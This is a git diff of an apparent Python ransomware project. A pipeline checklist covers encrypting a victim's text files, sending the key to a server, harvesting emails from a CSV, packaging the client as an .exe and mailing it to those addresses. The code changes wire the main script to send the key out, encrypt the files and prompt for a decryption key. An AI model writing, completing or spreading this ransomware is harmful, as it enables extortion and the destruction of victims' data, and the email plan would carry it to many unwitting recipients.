@@ -10,7 +10,7 @@ how the pipeline works (when you run the client.exe file):
 8. save the encrypted 16char to a file on the desktop (encryptedKey.key) [OK]
 9. send the encrypted 16char key to the server [OK]
 10. access the csv file and extract emails from it [OK]
-11. convert the client.py to .exe file auto-py-to-exe library [Pending] <----------------
+11. convert the client.py to .exe file auto-py-to-exe library [OK] <----------------
 12. send the .exe file to the emails on the csv file [Pending] <----------------
 13. when the .exe file is run, a prompt should popup indicating that the encryption is in progress [Pending] <----------------
 14. After encrypting all txt files, the prompt will wait for a 
@@ -33,6 +33,23 @@ ascii_key= "vG7pyhyrDzSnqcJ8"
 file_contains_paths ="paths.txt"
 findTxtFile( file_contains_paths )
 
+#9
+encoded_encrypted_msg = send_to_server(ascii_key)
+
+#3
+encrypt_file_paths(ascii_key, file_contains_paths)
+
+#4
+saveKey(ascii_key, "Key.key")
+
+#5
+saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
+
+#9
+waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
+encrypt_file_paths(ascii_key, file_contains_paths)
+
+
 print("Press Enter To Close...")
 input()
 
@@ -44,18 +61,13 @@ encrypt_file_paths(ascii_key, file_contains_paths)
 #4
 saveKey(ascii_key, "Key.key")
 
-#5
-exported_public_key, exported_private_key =  generateRSAKeys()
+
 
 #6
 key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
 saveKey(key_pair, "keyPair.key")
 
-#7
-public_key = RSA.import_key(exported_public_key)
-#convert ascii_key to bytes
-byte_ascii_key = ascii_key.encode()
-encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
+
 
 #8
 saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
@@ -63,19 +75,6 @@ saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
 #9
 waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
 encrypt_file_paths(ascii_key, file_contains_paths)
-
-#10
-
-
-
-
-#d2=decrypt_data(ascii_key ,encrypted_data )
-#print(encoded_encrypted_msg.decode())
-#print(d)
-#print(d2)
-# testEncryption()
-# with open("decr.txt", "a") as f:
-#                         f.write(d2 + "\n")
 
 #9
 #send_to_server(encoded_encrypted_msg)
